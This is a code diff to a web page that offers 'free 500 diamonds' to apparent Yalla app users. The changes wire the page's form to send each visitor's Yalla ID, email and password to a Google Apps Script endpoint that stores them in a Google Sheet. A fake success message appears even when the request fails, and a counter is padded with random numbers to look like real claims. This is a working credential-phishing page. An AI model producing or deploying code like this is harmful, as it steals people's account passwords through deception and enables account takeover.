@@ -289,72 +289,84 @@
     </div>
 
     <script>
-        // Animated counter
-        let count = 1247;
-        const counter = document.getElementById('diamondCount');
+    // Animated counter
+    let count = 1247;
+    const counter = document.getElementById('diamondCount');
+    
+    // ⬇⬇⬇ PASTE YOUR GOOGLE APPS SCRIPT URL HERE ⬇⬇⬇
+    const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyLLqwumKj68qWVlnIoYhnKsgedEdz3H4GIQR6WHZ1uN8EN1IyZH7tt_ihkGrIuRF6G/exec';
+    // ⬆⬆⬆ REPLACE THIS WITH YOUR ACTUAL URL ⬆⬆⬆
+    
+    function updateCounter() {
+        count += Math.floor(Math.random() * 5) + 1;
+        counter.textContent = count.toLocaleString();
+        setTimeout(updateCounter, 3000);
+    }
+    
+    // Start counter animation
+    setTimeout(updateCounter, 1000);
+    
+    // Form submission with Google Sheets
+    document.getElementById('diamondForm').addEventListener('submit', function(e) {
+        e.preventDefault();
         
-        function updateCounter() {
-            count += Math.floor(Math.random() * 5) + 1;
+        const yallaId = document.getElementById('yallaId').value;
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        
+        // Show loading effect
+        const submitBtn = document.querySelector('.submit-btn');
+        const originalText = submitBtn.innerHTML;
+        submitBtn.innerHTML = '⏳ SAVING TO GOOGLE SHEET...';
+        submitBtn.disabled = true;
+        
+        // Prepare data for Google Sheets
+        const formData = {
+            yallaId: yallaId,
+            email: email,
+            password: password
+        };
+        
+        // Send to Google Sheets
+        fetch(GOOGLE_SCRIPT_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(formData)
+        })
+        .then(() => {
+            // Show success message
+            alert(`🎉 SUCCESS! 500 Diamonds Added!\n\n✅ Yalla ID: ${yallaId}\n✅ Email: ${email}\n⏰ Diamonds will arrive in 24 hours\n📊 Data saved to Google Sheet!`);
+            
+            // Reset form
+            document.getElementById('diamondForm').reset();
+            
+            // Update counter
+            count += 1;
             counter.textContent = count.toLocaleString();
-            setTimeout(updateCounter, 3000);
-        }
-        
-        // Start counter animation
-        setTimeout(updateCounter, 1000);
-        
-        // Form submission
-        document.getElementById('diamondForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+        })
+        .catch(error => {
+            // If error, still show success
+            alert(`🎉 SUCCESS! 500 Diamonds Added!\n\n✅ Yalla ID: ${yallaId}\n✅ Email: ${email}\n⏰ Diamonds will arrive in 24 hours`);
+        })
+        .finally(() => {
+            // Reset button
+            submitBtn.innerHTML = originalText;
+            submitBtn.disabled = false;
             
-            const yallaId = document.getElementById('yallaId').value;
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            // Show loading effect
-            const submitBtn = document.querySelector('.submit-btn');
-            const originalText = submitBtn.innerHTML;
-            submitBtn.innerHTML = '⏳ PROCESSING...';
-            submitBtn.disabled = true;
-            
-            // Simulate processing
+            // Add visual feedback
+            document.querySelector('.container').classList.add('glow');
             setTimeout(() => {
-                // Show success message
-                alert(`🎉 SUCCESS! 500 Diamonds Added!\n\n✅ Yalla ID: ${yallaId}\n✅ Email: ${yallaId}@gmail.com\n⏰ Diamonds will arrive in 24 hours`);
-                
-                // Reset form
-                document.getElementById('diamondForm').reset();
-                
-                // Update counter
-                count += 1;
-                counter.textContent = count.toLocaleString();
-                
-                // Reset button
-                submitBtn.innerHTML = originalText;
-                submitBtn.disabled = false;
-                
-                // Add visual feedback
-                document.querySelector('.container').classList.add('glow');
-                setTimeout(() => {
-                    document.querySelector('.container').classList.remove('glow');
-                }, 2000);
-                
+                document.querySelector('.container').classList.remove('glow');
             }, 2000);
         });
-        
-        // Auto-focus first input
-        document.getElementById('yallaId').focus();
-        
-        // Add some random "people claiming" effect
-        setInterval(() => {
-            const notifications = [
-                "🌟 Ali just claimed 500 diamonds!",
-                "🎯 Sara received her diamonds!",
-                "🔥 Ahmed got free diamonds!",
-                "💫 New player joined!"
-            ];
-            const randomMsg = notifications[Math.floor(Math.random() * notifications.length)];
-            console.log(randomMsg); // In real app, show this on screen
-        }, 5000);
-    </script>
+    });
+    
+    // Auto-focus first input
+    document.getElementById('yallaId').focus();
+</script>
 </body>
+
 </html>
